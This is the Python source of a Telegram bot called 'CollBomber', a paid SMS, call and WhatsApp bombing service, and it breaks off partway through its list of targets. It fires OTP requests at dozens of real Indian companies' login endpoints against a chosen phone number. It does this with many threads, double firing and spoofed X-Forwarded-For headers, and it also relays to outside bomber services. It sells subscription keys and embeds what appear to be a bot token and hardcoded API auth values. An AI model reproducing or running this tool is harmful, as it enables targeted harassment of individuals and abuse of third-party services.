#!/usr/bin/env python3
"""
🔥 CollBomber Telegram Bot — Ultra Fast Mode
Package: com.rolex.mybasic.collbomber
100+ APIs | Call + SMS + WhatsApp + Mix | Multi-threaded
"""

import telebot
from telebot import types
import requests
import threading
import time
import random
import uuid
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import json
from collections import defaultdict

# ============================================================
# CONFIG — Bot Token + Speed Settings
# ============================================================
import os
# Try env first, then config file, then write token from env to file
API_TOKEN = os.environ.get("8961528591:AAHme1dCKPUAvmXcsO6MlgfkAoiqUdDY_U4", "")
if not API_TOKEN:
    try:
        from config_token import TOKEN as API_TOKEN
    except ImportError:
        API_TOKEN = ""
        print("⚠️ No token found! Check BOT_TOKEN env variable.")
    
# If BOT_TOKEN is set in env but config_token.py doesn't exist, create it
if API_TOKEN and not os.path.exists("config_token.py"):
    try:
        with open("config_token.py", "w") as f:
            f.write(f'TOKEN="{API_TOKEN}"\n')
        print("✅ Created config_token.py from BOT_TOKEN env")
    except:
        pass

MAX_WORKERS = 25  # Optimal — 25 concurrent threads
SMS_MAX_WORKERS = 80  # SMS mode gets 80 workers for more power
DELAY_BETWEEN_ROUNDS = 0.5  # 500ms between rounds
SMS_DELAY_BETWEEN_ROUNDS = 0.15  # 150ms between SMS rounds — faster!
SMS_DOUBLE_FIRE = True  # Double fire — har API ek round mein 2 baar fire!
SMS_AUTO_RETRY = True  # Retry failed SMS APIs immediately

IMPORTANT_CALL_INTERVAL = 5  # Important call APIs fire every 5 seconds
IMPORTANT_5S_INTERVAL = 5  # 5-second important APIs fire every 5 seconds

# ============================================================
# ADMIN CONFIG
# ============================================================
ADMIN_IDS = [7812058540]  # Aloevera — Super Admin
ADMIN_DB_PATH = "admin_db.json"  # User tracking database

# ============================================================
# CHANNEL CONFIG — Join required to use the bomber
# ============================================================
REQUIRED_CHANNEL = "@rolexjjjjjjsajsh"  # Channel to join
CHANNEL_LINK = "https://t.me/rolexjjjjjjsajsh"  # Channel invite link
WELCOME_IMAGE = "https://imgh.in/host/gdzq2c"  # Welcome image URL

bot = telebot.TeleBot(API_TOKEN)

# ============================================================
# ADMIN DATABASE — Track all users, bans, logs
# ============================================================
class AdminDB:
    def __init__(self, db_path=ADMIN_DB_PATH):
        self.db_path = db_path
        self.lock = threading.Lock()
        self.data = self._load()

    def _load(self):
        try:
            with open(self.db_path) as f:
                return json.load(f)
        except:
            return {"users": {}, "banned": [], "admins": [], "broadcasts": 0, "total_bombs": 0, "verified": [], "keys": {}, "subscriptions": {}, "trials": {}}

    def _save(self):
        with open(self.db_path, "w") as f:
            json.dump(self.data, f, indent=2)

    def track_user(self, user_id, username, phone, mode):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["users"]:
                self.data["users"][uid] = {
                    "username": username or "Unknown",
                    "first_seen": datetime.now().isoformat(),
                    "phone": phone,
                    "total_sessions": 0,
                    "total_hits": 0,
                    "total_ok": 0,
                    "total_fail": 0,
                    "total_rounds": 0,
                    "modes_used": [],
                    "last_active": datetime.now().isoformat(),
                    "last_phone": phone,
                    "last_mode": mode
                }
            u = self.data["users"][uid]
            u["last_active"] = datetime.now().isoformat()
            u["last_phone"] = phone
            u["last_mode"] = mode
            u["total_sessions"] += 1
            if mode not in u["modes_used"]:
                u["modes_used"].append(mode)
            u["username"] = username or u["username"]
            self._save()

    def update_stats(self, user_id, ok, fail, rounds, total):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["users"]:
                u = self.data["users"][uid]
                u["total_hits"] += total
                u["total_ok"] += ok
                u["total_fail"] += fail
                u["total_rounds"] += rounds
                u["last_active"] = datetime.now().isoformat()
                self.data["total_bombs"] += total
                self._save()

    def is_banned(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("banned", [])

    def is_admin(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("admins", []) or user_id in ADMIN_IDS

    def ban_user(self, user_id, admin_id):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["banned"]:
                self.data["banned"].append(uid)
                self.data.setdefault("ban_log", []).append({
                    "user_id": uid, "admin_id": admin_id, "action": "ban",
                    "time": datetime.now().isoformat()
                })
                self._save()
                return True
            return False

    def unban_user(self, user_id, admin_id):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["banned"]:
                self.data["banned"].remove(uid)
                self.data.setdefault("ban_log", []).append({
                    "user_id": uid, "admin_id": admin_id, "action": "unban",
                    "time": datetime.now().isoformat()
                })
                self._save()
                return True
            return False

    def add_admin(self, user_id, added_by):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["admins"]:
                self.data["admins"].append(uid)
                self._save()
                return True
            return False

    def remove_admin(self, user_id, removed_by):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["admins"]:
                self.data["admins"].remove(uid)
                self._save()
                return True
            return False

    def get_admins(self):
        with self.lock:
            return list(self.data.get("admins", []))

    def get_subscribed_count(self):
        with self.lock:
            subs = self.data.get("subscriptions", {})
            count = 0
            for uid, sub in subs.items():
                if sub.get("expires_at"):
                    try:
                        expires = datetime.fromisoformat(sub["expires_at"])
                        if datetime.now() > expires:
                            continue
                    except:
                        pass
                count += 1
            return count

    def get_subscription_stats(self):
        with self.lock:
            subs = self.data.get("subscriptions", {})
            plans = {"trial": 0, "standard": 0, "premium": 0, "vip": 0}
            active = 0
            expired = 0
            for uid, sub in subs.items():
                plan = sub.get("plan", "unknown")
                if sub.get("expires_at"):
                    try:
                        expires = datetime.fromisoformat(sub["expires_at"])
                        if datetime.now() > expires:
                            expired += 1
                            continue
                    except:
                        pass
                active += 1
                if plan in plans:
                    plans[plan] += 1
            return {"active": active, "expired": expired, "plans": plans}

    def get_all_users(self):
        with self.lock:
            return dict(self.data["users"])

    def get_user_count(self):
        with self.lock:
            return len(self.data["users"])

    def get_banned_count(self):
        with self.lock:
            return len(self.data.get("banned", []))

    def get_total_bombs(self):
        with self.lock:
            return self.data.get("total_bombs", 0)

    def verify_user(self, user_id):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data.get("verified", []):
                self.data.setdefault("verified", []).append(uid)
                self._save()
                return True
            return False

    def is_verified(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("verified", [])

    # ====== FREE TRIAL SYSTEM ======
    def start_trial(self, user_id):
        with self.lock:
            uid = str(user_id)
            trials = self.data.setdefault("trials", {})
            if uid in trials:
                return False, "❌ Aap already trial le chuke hain!"
            now = datetime.now()
            from datetime import timedelta
            expires = (now + timedelta(days=30)).isoformat()
            trials[uid] = {
                "started_at": now.isoformat(),
                "expires_at": expires,
                "plan": "trial"
            }
            # Also create subscription entry
            subs = self.data.setdefault("subscriptions", {})
            subs[uid] = {
                "plan": "trial",
                "started_at": now.isoformat(),
                "expires_at": expires,
                "max_concurrent": 2,
                "max_hours": 4,
                "price": 0
            }
            self._save()
            return True, f"✅ *Trial Activated!*\n\n🎯 Plan: 30 Day Free Trial\n⚡ Concurrent: 2\n⏰ Max Hours: 4h\n📅 Expires: {expires[:10]}"

    def has_trial(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("trials", {})

    # ====== KEY / SUBSCRIPTION SYSTEM ======
    def generate_key(self, plan, created_by):
        with self.lock:
            self.data.setdefault("keys", {})
            self.data.setdefault("subscriptions", {})
            # Generate unique key
            import hashlib, time
            raw = f"{plan}_{uuid.uuid4().hex}_{time.time()}_{random.randint(1000,9999)}"
            key = hashlib.md5(raw.encode()).hexdigest()[:16].upper()
            key = "-".join([key[i:i+4] for i in range(0, 16, 4)])
            
            plan_config = {
                "standard": {"days": 30, "concurrent": 2, "hours": 8, "price": 99},
                "premium": {"days": 60, "concurrent": 5, "hours": 24, "price": 199},
                "vip": {"days": 99999, "concurrent": 99, "hours": 999, "price": 499},
            }
            cfg = plan_config.get(plan, plan_config["standard"])
            
            self.data["keys"][key] = {
                "plan": plan,
                "days": cfg["days"],
                "concurrent": cfg["concurrent"],
                "max_hours": cfg["hours"],
                "price": cfg["price"],
                "created_by": created_by,
                "created_at": datetime.now().isoformat(),
                "used": False,
                "used_by": None,
                "used_at": None,
                "expires_at": None
            }
            self._save()
            return key

    def redeem_key(self, key, user_id):
        with self.lock:
            self.data.setdefault("keys", {})
            self.data.setdefault("subscriptions", {})
            uid = str(user_id)
            
            if key not in self.data["keys"]:
                return False, "❌ Invalid key! Yeh key exist nahi karti."
            
            k = self.data["keys"][key]
            if k["used"]:
                return False, "❌ Yeh key already used ho chuki hai!"
            
            # Activate subscription
            now = datetime.now()
            if k["days"] >= 99999:
                # VIP Lifetime — no expiry
                expires = (now.replace(year=now.year + 50)).isoformat()
            else:
                from datetime import timedelta
                expires = (now + timedelta(days=k["days"])).isoformat()
            
            self.data["subscriptions"][uid] = {
                "plan": k["plan"],
                "started_at": now.isoformat(),
                "expires_at": expires,
                "max_concurrent": k["concurrent"],
                "max_hours": k["max_hours"],
                "price": k["price"],
                "active": True
            }
            
            k["used"] = True
            k["used_by"] = uid
            k["used_at"] = now.isoformat()
            self._save()
            return True, (f"✅ *Plan Activated!*\n\n"
                          f"🎯 Plan: {k['plan'].upper()}\n"
                          f"⏱ Duration: {k['days']} days\n"
                          f"⚡ Concurrent: {k['concurrent']}\n"
                          f"⏰ Max Hours: {k['max_hours']}h")

    def get_subscription(self, user_id):
        with self.lock:
            uid = str(user_id)
            sub = self.data.get("subscriptions", {}).get(uid)
            if not sub:
                return None
            # Check expiry
            if sub.get("expires_at"):
                expires = datetime.fromisoformat(sub["expires_at"])
                if datetime.now() > expires:
                    sub["active"] = False
                    self._save()
                    return None
            return sub

    def get_all_keys(self):
        with self.lock:
            return dict(self.data.get("keys", {}))

    def cancel_subscription(self, user_id, admin_id):
        with self.lock:
            uid = str(user_id)
            subs = self.data.get("subscriptions", {})
            if uid not in subs:
                return False, "❌ Yeh user kisi bhi plan ke under nahi hai!"
            sub = subs[uid]
            plan = sub.get("plan", "unknown")
            self.data.setdefault("cancelled_subs", {})
            self.data["cancelled_subs"][uid] = {
                "original_plan": plan,
                "cancelled_at": datetime.now().isoformat(),
                "cancelled_by": str(admin_id),
                "old_sub": sub
            }
            del subs[uid]
            self._save()
            return True, f"✅ User `{uid}` ka {plan.upper()} plan cancel kar diya gaya!"

    def get_subscribed_users(self):
        with self.lock:
            users = self.data.get("users", {})
            subs = self.data.get("subscriptions", {})
            result = {}
            for uid, sub in subs.items():
                if sub.get("expires_at"):
                    try:
                        expires = datetime.fromisoformat(sub["expires_at"])
                        if datetime.now() > expires:
                            continue
                    except:
                        pass
                user_info = users.get(uid, {})
                result[uid] = {
                    "user": user_info,
                    "sub": sub
                }
            return result

    def get_non_subscribed_users(self):
        with self.lock:
            users = self.data.get("users", {})
            subs = self.data.get("subscriptions", {})
            result = {}
            for uid, u in users.items():
                if uid not in subs:
                    result[uid] = u
                else:
                    sub = subs[uid]
                    if sub.get("expires_at"):
                        try:
                            expires = datetime.fromisoformat(sub["expires_at"])
                            if datetime.now() > expires:
                                result[uid] = u
                        except:
                            pass
            return result

admin_db = AdminDB()

# ============================================================
# API CONFIG — All 100+ APIs from the Android app
# ============================================================
class ApiConfig:
    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms", delay_ms=0):
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
        self.body = body
        self.category = category
        self.delay_ms = delay_ms

    def build_request(self, phone, duration=3):
        ts = str(int(time.time() * 1000))
        rand_id = uuid.uuid4().hex[:8]
        uid = uuid.uuid4().hex
        md5 = uid.replace("-", "")[:32]
        random_pan = random.choice(["ABCDE1234F", "GDODJ5434B", "GSISB5468H", "HSOSN5464B",
                                     "FUOUR2389B", "VUJVU5675H", "TSISV5434B"])

        final_url = self.url
        for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                         ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                         ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
            final_url = final_url.replace(key, val)

        headers = dict(self.headers)
        if "X-Forwarded-For" not in headers and "Client-IP" not in headers:
            spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Forwarded-For"] = spoof
            headers["Client-IP"] = spoof

        try:
            if self.method.upper() == "POST":
                data = self.body or ""
                for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                                 ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                                 ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
                    data = data.replace(key, val)
                return requests.Request("POST", final_url, headers=headers, data=data)
            else:
                return requests.Request("GET", final_url, headers=headers)
        except:
            return requests.Request("GET", final_url, headers=headers)


# ============================================================
# ALL APIs — Categories: call, sms, whatsapp
# ============================================================
def get_all_apis():
    apis = []

    # --- CALL APIs ---
    call_apis = [
        ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),
        ApiConfig("1MG_Call", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":true}', "call"),
        ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
                  {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Myntra_Call", "https://www.myntra.com/gw/mobile-auth/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
        ApiConfig("Paytm_Call", "https://accounts.paytm.com/signin/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}', "call"),
        ApiConfig("Zomato_Call", "https://www.zomato.com/php/asyncLogin.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}", "call"),
        ApiConfig("MakeMyTrip_Call", "https://www.makemytrip.com/api/umbrella/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Uber_Call", "https://auth.uber.com/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BigBasket_Call", "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}"}', "call"),
        ApiConfig("PhonePe_Call", "https://www.phonepe.com/api/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("OYO_Call", "https://api.oyoroomscrm.com/api/v2/user/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Rapido_Call", "https://rapido.bike/api/v2/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BookMyShow_Call", "https://in.bmscdn.com/mjson/User/SendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}"}', "call"),
        ApiConfig("Meesho_Call", "https://api.meesho.com/v2/auth/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Snapdeal_Call", "https://www.snapdeal.com/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Croma_Call", "https://api.croma.com/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Call_Bomber", "https://call-bomber-50k3t8a6r.vercel.app/bomb?number={phone}", "GET",
                  {}, None, "call"),
        ApiConfig("Jio_Call", "https://www.jio.com/api/jio-login-service/login/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}', "call"),
    ]
    apis.extend(call_apis)

    # --- WHATSAPP APIs ---
    whatsapp_apis = [
        ApiConfig("KPN_WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":{"number":"{phone}","country_code":"+91"}}', "whatsapp"),
        ApiConfig("EkaCare_WhatsApp", "https://auth.eka.care/auth/init", "POST",
                  {"Content-Type": "application/json"}, '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}', "whatsapp"),
        ApiConfig("MamaEarth_WA", "https://auth.mamaearth.in/v1/auth/initiate-signup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "whatsapp"),
        ApiConfig("Havells_WA", "https://havells.com/otplogin/account/otploginpost/", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on", "whatsapp"),
        ApiConfig("HeroFinCorp_WA", "https://loans.apps.herofincorp.com/api/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","terms":true,"whatsapp":true}', "whatsapp"),
    ]
    apis.extend(whatsapp_apis)

    # --- ThakurBombCyber (also fires every 5s via IMPORTANT_5S_APIS) ---
    apis.append(ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
                          {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"))

    # --- SMS APIs ---
    sms_apis = [
        ApiConfig("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phoneCode":"+91","telephone":"{phone}"}'),
        ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN"),
        ApiConfig("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Wakefit", "https://api.wakefit.co/api/consumer-sms-otp/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Meru", "https://merucabapp.com/api/otp/generate", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
        ApiConfig("Doubtnut", "https://api.doubtnut.com/v4/student/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}","language":"en"}'),
        ApiConfig("ShipRocket", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
        ApiConfig("Servetel", "https://api.servetel.in/v1/auth/otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
        ApiConfig("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"+91{phone}"}'),
        ApiConfig("Housing", "https://login.housing.com/api/v2/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_url_name":"in"}'),
        ApiConfig("RentoMojo", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Khatabook", "https://api.khatabook.com/v1/auth/request-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'),
        ApiConfig("Nykaa", "https://www.nykaa.com/app-api/index.php/customer/send_otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "source=sms&mobile_number={phone}"),
        ApiConfig("RummyCircle", "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isPlaycircle":false}'),
        ApiConfig("Cosmofeed", "https://prod.api.cosmofeed.com/api/user/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","version":"1.4.28"}'),
        ApiConfig("Revv", "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","deviceType":"website"}'),
        ApiConfig("PayMe_India", "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'),
        ApiConfig("Bomberr", "https://bomberr.onrender.com/num={phone}", "GET", {}, None),
        ApiConfig("PaisaOnSalary", "https://cms.paisaonsalary.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.paisaonsalary.com", "referer": "https://www.paisaonsalary.com/"},
                  '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
        ApiConfig("PaisaBoxx", "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}&partner_id=6350faa323&source=hexa&campaign=delhi_5499", "POST",
                  {"Content-Type": "application/json", "Content-Length": "0", "origin": "https://www.paisaboxx.com", "referer": "https://www.paisaboxx.com/"}, "{}"),
        ApiConfig("LoanZap", "https://webapi.loanzap.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.loanzap.in", "referer": "https://www.loanzap.in/"},
                  '{"name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}'),
        ApiConfig("CashKredit", "https://api.cashkredit.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.cashkredit.in", "referer": "https://www.cashkredit.in/"},
                  '{"pan":"ABCDE1234F","name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}'),
        ApiConfig("RupeeLending", "https://rupeelending.com/apply-now/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://rupeelending.com", "referer": "https://rupeelending.com/apply-now"}, '{"mobile":"{phone}"}'),
        ApiConfig("BrightLoans", "https://brightloans.in/login-sbm", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://brightloans.in", "referer": "https://brightloans.in/apply-now"},
                  "mobile={phone}&current_page=login&is_existing_customer=2&device_id={random_md5}"),
        ApiConfig("SalaryTopUp", "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "Auth": "MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU=", "origin": "https://salarytopup.com", "referer": "https://salarytopup.com/"},
                  '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
        ApiConfig("TezCredit", "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tezcredit.com", "referer": "https://www.tezcredit.com/", "Content-Length": "0"}, "{}"),
        ApiConfig("Swiggy_SMS", "https://www.swiggy.com/mapi/auth/sms-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.swiggy.com", "referer": "https://www.swiggy.com/auth"},
                  '{"mobile":"{phone}","_csrf":"wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk"}'),
        ApiConfig("TataCapital_HL", "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"},
                  '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","sourceName":"Website","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'),
        ApiConfig("TataCapital_PL", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"},
                  '{"mobileNumber":"{phone}","deviceOS":"Web","applSource":"PL","deviceType":"Web","deviceSubType":""}'),
        ApiConfig("TataCapital_LAP", "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"},
                  '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'),
        ApiConfig("Univest", "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "GET",
                  {"origin": "https://univest.in", "referer": "https://univest.in/"}),
        ApiConfig("HeroFinCorp_Festive", "https://festive.api.herofincorp.com/v1/customer/otp/{phone}", "GET",
                  {"origin": "https://festive.herofincorp.com", "referer": "https://festive.herofincorp.com/"}),
        ApiConfig("MuscleBlaze", "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "GET",
                  {"origin": "https://www.muscleblaze.com", "referer": "https://www.muscleblaze.com/"}),
        ApiConfig("INRFlash", "https://offers.inrflash.com/campinr/index.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://offers.inrflash.com", "referer": "https://offers.inrflash.com/campinr/index.php"},
                  "action=send_otp&phoneNo={phone}"),
        ApiConfig("MuthootFinance", "https://www.muthootfinance.com/smsapi.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.muthootfinance.com", "referer": "https://www.muthootfinance.com/services/Insta-OD/"},
                  "mobile={phone}&pin=Xmd6TERfO1haXjo3"),
        ApiConfig("CRMSL", "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=", "origin": "https://suryaloan.com", "referer": "https://suryaloan.com/"},
                  '{"mobile":"{phone}","event_name":"login","utm_source":"Value_Leaf","utm_medium":"GoogleBsub_id1}","utm_campaign":"pmax_1","utm_term":"836_01","utm_content":""}'),
        ApiConfig("Factori", "https://factori.com/login/check_user_exists", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account"},
                  "mobNumber={phone}&countryCode=91"),
        ApiConfig("Zepto", "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.zepto.com", "referer": "https://www.zepto.com/", "X-Requested-With": "via.bolte"},
                  '{"mobileNumber":"{phone}"}'),
        ApiConfig("OneMG", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.1mg.com", "referer": "https://www.1mg.com/"},
                  '{"number":"{phone}"}'),
        ApiConfig("ShipRocket2", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.shiprocket.in", "referer": "https://www.shiprocket.in/"},
                  '{"mobileNumber":"{phone}"}'),
        ApiConfig("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://gokwik.co", "referer": "https://gokwik.co/"},
                  '{"phone":"{phone}","country":"in"}'),
        ApiConfig("EntriApp", "https://entri.app/api/v3/users/check-phone/", "POST",
                  {"Content-Type": "application/json", "origin": "https://learn.entri.app", "referer": "https://learn.entri.app/"},
                  '{"phone":"+91{phone}","recaptcha_response":"dummy_token"}'),
        ApiConfig("Apna", "https://production.apna.co/api/userprofile/v1/otp/", "POST",
                  {"Content-Type": "application/json", "origin": "https://apna.co", "referer": "https://apna.co/"},
                  '{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'),
        ApiConfig("DigiCredit", "https://customer-backend.digicredit.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1", "origin": "https://applyloan.digicredit.in", "referer": "https://applyloan.digicredit.in/"},
                  '{"phoneNo":"{phone}","journey_down":"true"}'),
        ApiConfig("Moglix", "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "POST",
                  {"Content-Type": "application/json", "x-platform": "PWA", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/"},
                  '{"email":"","phone":"{phone}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'),
        ApiConfig("Housing2", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer", "origin": "https://housing.com", "referer": "https://housing.com/"},
                  '{"query":"mutation($phone:String){sendOtp(phone:$phone){success message}}","variables":{"phone":"{phone}"}}'),
        ApiConfig("MyMoneyBazaar", "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json", "origin": "https://web.mymoneybazaar.com", "referer": "https://web.mymoneybazaar.com/"},
                  '{"phone_number":"{phone}"}'),
        ApiConfig("Shopsy", "https://www.shopsy.in/1.rome/api/1/action/view", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.shopsy.in", "referer": "https://www.shopsy.in/login"},
